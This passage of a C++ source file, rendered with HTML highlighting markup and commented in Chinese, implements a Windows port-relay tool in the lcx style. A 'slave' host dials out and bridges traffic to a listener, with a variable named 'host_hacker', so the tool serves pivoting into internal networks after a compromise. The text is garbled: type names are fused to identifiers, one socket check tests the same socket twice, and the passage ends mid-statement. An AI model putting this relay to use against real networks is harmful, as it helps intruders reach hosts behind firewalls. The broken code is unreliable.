&lt;TransmitPort&gt;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">************************************************************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_NONSTDC_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//宏定义</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">SOCKETs1;</span><br><span class="line">SOCKETs2;</span><br><span class="line">&#125;Stu_sock;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">version</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">param</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>;<span class="comment">//对命令行参数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Funlisten</span><span class="params">(<span class="keyword">int</span> port1, <span class="keyword">int</span> port2)</span></span>;<span class="comment">//监听功能函数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bindAndFunlisten</span><span class="params">(SOCKET s, <span class="keyword">int</span> port)</span></span>;<span class="comment">//绑定socket的地址结构</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">datatrans</span><span class="params">(LPVOID data)</span></span>;<span class="comment">//数据转发函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slave</span><span class="params">(<span class="keyword">char</span>* hostIp, <span class="keyword">char</span>* slaveIp, <span class="keyword">int</span> destionPort, <span class="keyword">int</span> slavePort)</span></span>;<span class="comment">//slave函数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkIP</span><span class="params">(<span class="keyword">char</span>* str)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">char</span>* server, <span class="keyword">int</span> port)</span></span>;<span class="comment">//连接服务端</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">version();</span><br><span class="line"><span class="comment">//参数判断</span></span><br><span class="line">WSADATA wsadata;</span><br><span class="line">WSAStartup(MAKEWORD(<span class="number">1</span>, <span class="number">1</span>), &amp;wsadata);</span><br><span class="line"><span class="keyword">char</span> hostIp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> slaveIp[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line">ret = param(argc, argv);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">1</span>)<span class="comment">//Funlisten</span></span><br><span class="line">&#123;</span><br><span class="line">Funlisten(atoi(argv[<span class="number">2</span>]), atoi(argv[<span class="number">3</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ret == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(hostIp, argv[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">strcpy</span>(slaveIp, argv[<span class="number">4</span>]);</span><br><span class="line">slave(argv[<span class="number">2</span>], argv[<span class="number">4</span>], atoi(argv[<span class="number">3</span>]), atoi(argv[<span class="number">5</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">param</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//stricmp==strcmp ignore case忽略大小写</span></span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">4</span> &amp;&amp; stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-listen&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;Funlisten&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">6</span> &amp;&amp; stricmp(argv[<span class="number">1</span>], <span class="string">&quot;-slave&quot;</span>) == <span class="number">0</span> &amp;&amp; checkIP(argv[<span class="number">2</span>]) &amp;&amp; checkIP(argv[<span class="number">4</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">version();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*                                                                      */</span></span><br><span class="line"><span class="comment">/*listen 功能模块*/</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Funlisten</span><span class="params">(<span class="keyword">int</span> port1, <span class="keyword">int</span> port2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Stu_sockstu_sock;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">SOCKET sock1 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">SOCKET sock2 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (sock1 &lt; <span class="number">0</span> || sock1 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Create socket error&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定端口到socket并监听</span></span><br><span class="line"><span class="keyword">if</span> (!bindAndFunlisten(sock1, port1) || !bindAndFunlisten(sock2, port2))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//都监听好了接下来……</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> SizeOfAddr = <span class="keyword">sizeof</span>(sockaddr);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Waiting for Client ......&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">sockaddr_inremoteSockAddr;</span><br><span class="line"><span class="comment">//sock1等待连接</span></span><br><span class="line">SOCKETrecvSock1 = accept(sock1, (sockaddr*)&amp;remoteSockAddr, &amp;SizeOfAddr);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; recvSock1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (recvSock1 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Accept error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept a Client on port &quot;</span> &lt;&lt; port1 &lt;&lt; <span class="string">&quot;  from &quot;</span> &lt;&lt; inet_ntoa(remoteSockAddr.sin_addr) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Waiting another Client on port:&quot;</span> &lt;&lt; port2 &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">SOCKETrecvSock2 = accept(sock2, (sockaddr*)&amp;remoteSockAddr, &amp;SizeOfAddr);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; recvSock2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (recvSock2 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Accept error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept a Client on port&quot;</span> &lt;&lt; port1 &lt;&lt; <span class="string">&quot;  from &quot;</span> &lt;&lt; inet_ntoa(remoteSockAddr.sin_addr) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个都连上来了</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept Connect OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stu_sock.s1 = recvSock1;stu_sock.s2 = recvSock2;</span><br><span class="line">DWORDdwThreadID;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个转发数据的线程</span></span><br><span class="line">HANDLEhThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)datatrans, (LPVOID)&amp;stu_sock, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">TerminateThread(hThread, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//线程错了直接退出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] CreateThread OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Sleep(<span class="number">800</span>);<span class="comment">//挂起当前线程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bindAndFunlisten</span><span class="params">(SOCKET s, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//地址结构</span></span><br><span class="line">sockaddr_inaddr;</span><br><span class="line"><span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">addr.sin_port = htons(port);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> on = <span class="number">1</span>;</span><br><span class="line">setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;on, <span class="keyword">sizeof</span>(on));</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定地址结构</span></span><br><span class="line"><span class="keyword">if</span> (bind(s, (<span class="keyword">const</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(sockaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Socket bind error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听端口</span></span><br><span class="line"><span class="keyword">if</span> (listen(s, <span class="number">5</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Listen error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">datatrans</span><span class="params">(LPVOID data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> host_slave[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> host_hacker[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Stu_sock* stuSock = (Stu_sock*)data;</span><br><span class="line">SOCKETs1 = stuSock-&gt;s1;<span class="comment">//接受的是slave的数据</span></span><br><span class="line">SOCKETs2 = stuSock-&gt;s2;<span class="comment">//发送出去的socket</span></span><br><span class="line"><span class="keyword">int</span>sentacount1 = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//cout&lt;&lt;stuSock-&gt;s1&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;stuSock-&gt;s2&lt;&lt;endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sockaddr_inaddr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> sizeofaddr = <span class="keyword">sizeof</span>(sockaddr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getpeername(s1, (sockaddr*)&amp;addr, &amp;sizeofaddr))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(host_slave, inet_ntoa(addr.sin_addr));</span><br><span class="line"><span class="keyword">int</span> port_slave = ntohs(addr.sin_port);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (getpeername(s2, (sockaddr*)&amp;addr, &amp;sizeofaddr))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(host_hacker, inet_ntoa(addr.sin_addr));</span><br><span class="line"><span class="keyword">int</span> port_hacker = ntohs(addr.sin_port);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Start Transport (&quot;</span> &lt;&lt; host_slave &lt;&lt; <span class="string">&quot;&lt;-&gt; &quot;</span> &lt;&lt; host_hacker &lt;&lt; <span class="string">&quot;) ......&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">char</span> RecvBuffer[<span class="number">20480</span>];</span><br><span class="line"><span class="keyword">char</span> SendBuffer[<span class="number">20480</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fd_setreadfd; fd_setwritefd;</span><br><span class="line">timevaltimeset;</span><br><span class="line">timeset.tv_sec = <span class="number">300</span>;</span><br><span class="line">timeset.tv_usec = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> maxfd = max(s1, s2) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">int</span> readsize;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">readsize = <span class="number">0</span>;</span><br><span class="line">FD_ZERO(&amp;readfd);</span><br><span class="line">FD_ZERO(&amp;writefd);</span><br><span class="line">FD_SET((UINT)s1, &amp;readfd);</span><br><span class="line">FD_SET((UINT)s2, &amp;readfd);</span><br><span class="line">FD_SET((UINT)s1, &amp;writefd);</span><br><span class="line">FD_SET((UINT)s2, &amp;writefd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> result = select(maxfd, &amp;readfd, &amp;writefd, <span class="literal">NULL</span>, &amp;timeset);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result &lt; <span class="number">0</span> &amp;&amp; (errno != EINTR))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Select error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Socket time out.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//没出错，没超时</span></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s1, &amp;readfd) &amp;&amp; flag)<span class="comment">///////////////////////////////////1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//if (totalread1&lt;20408)</span></span><br><span class="line">&#123;</span><br><span class="line">readsize = recv(s1, RecvBuffer, <span class="number">20480</span>, <span class="number">0</span>);<span class="comment">//接受host的请求。。</span></span><br><span class="line"><span class="keyword">if</span> (readsize == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (readsize == SOCKET_ERROR || readsize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(SendBuffer, RecvBuffer, readsize);</span><br><span class="line"><span class="built_in">memset</span>(RecvBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; [+] Recv &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="string">&quot;from host.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s1, &amp;writefd) &amp;&amp; flag &amp;&amp; (readsize &gt; <span class="number">0</span>))<span class="comment">///////////////////////////////////2</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sendsize = send(s2, SendBuffer, readsize, <span class="number">0</span>);<span class="comment">//发给slave</span></span><br><span class="line"><span class="keyword">if</span> (sendsize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (sendsize &lt; <span class="number">0</span> &amp;&amp; (errno != EINTR))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send to s2 unknow error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(SendBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Send &quot;</span> &lt;&lt; sendsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s2, &amp;readfd) &amp;&amp; (!flag))<span class="comment">///////////////////////////////////3</span></span><br><span class="line">&#123;</span><br><span class="line">&#123;</span><br><span class="line">readsize = recv(s2, RecvBuffer, <span class="number">20480</span>, <span class="number">0</span>);<span class="comment">//接受slave返回数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(SendBuffer, RecvBuffer, readsize);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; [+] Recv &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="string">&quot;from host.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//totalread1+=readsize;</span></span><br><span class="line"><span class="built_in">memset</span>(RecvBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s1, &amp;writefd) &amp;&amp; (!flag) &amp;&amp; (readsize &gt; <span class="number">0</span>))<span class="comment">///////////////////////////////////4</span></span><br><span class="line">&#123;</span><br><span class="line">readsize = send(s1, SendBuffer, readsize, <span class="number">0</span>);<span class="comment">//发给host</span></span><br><span class="line"><span class="keyword">if</span> (readsize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (readsize &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send to s2 unknow error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Send &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">memset</span>(SendBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = !flag;</span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">closesocket(s1);</span><br><span class="line">closesocket(s2);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] OK! I Closed The Two Socket.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*                                                                      */</span></span><br><span class="line"><span class="comment">/*slave 功能模块*/</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slave</span><span class="params">(<span class="keyword">char</span>* hostIp, <span class="keyword">char</span>* slaveIp, <span class="keyword">int</span> destionPort, <span class="keyword">int</span> slavePort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//checkIP(hostIp);</span></span><br><span class="line">Stu_sockstu_sock;</span><br><span class="line">fd_setfd;</span><br><span class="line"><span class="keyword">char</span>buffer[<span class="number">20480</span>];</span><br><span class="line"><span class="keyword">int</span>l;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">SOCKET sock1 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">SOCKET sock2 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Make a Connection to &quot;</span> &lt;&lt; hostIp &lt;&lt; <span class="string">&quot;on port:&quot;</span> &lt;&lt; slaveIp &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (sock1 &lt; <span class="number">0</span> || sock1 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Create socket error&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="keyword">if</span> (client_connect(sock1, hostIp, destionPort) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">closesocket(sock1);</span><br><span class="line">closesocket(sock2);</span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">/*跳过这次循环*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//把sock清零,加入set集</span></span><br><span class="line">FD_ZERO(&amp;fd);</span><br><span class="line">FD_SET(sock1, &amp;fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//select事件读 写 异常</span></span><br><span class="line"><span class="keyword">if</span> (select(sock1 + <span class="number">1</span>, &amp;fd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//不懂</span></span><br><span class="line"><span class="keyword">if</span> (errno == WSAEINTR) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//FD_ISSET返回值&gt;0 表示SET里的可读写</span></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(sock1, &amp;fd))</span><br><span class="line">&#123;</span><br><span class="line">l = recv(sock1, buffer, <span class="number">20480</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">Sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] There is a error...Create a new connection.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Connect OK!    \n[+] xlcTeam congratulations!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Make a Connection to &quot;</span> &lt;&lt; hostIp &lt;&lt; <span class="string">&quot;on port:&quot;</span> &lt;&lt; slaveIp &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="keyword">if</span> (client_connect(sock2, slaveIp, slavePort) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">closesocket(sock1);</span><br><span class="line">closesocket(sock2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (send(sock2, buffer, l, <span class="number">0</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send failed.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] All Connect OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">stu_sock.s1 = sock1;</span><br><span class="line">stu_sock.s2 = sock2;</span><br><span class="line"></span><br><span class="line">HANDLEhThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)datatrans, (LPVOID)&amp;stu_sock, <span class="number">0</span>, 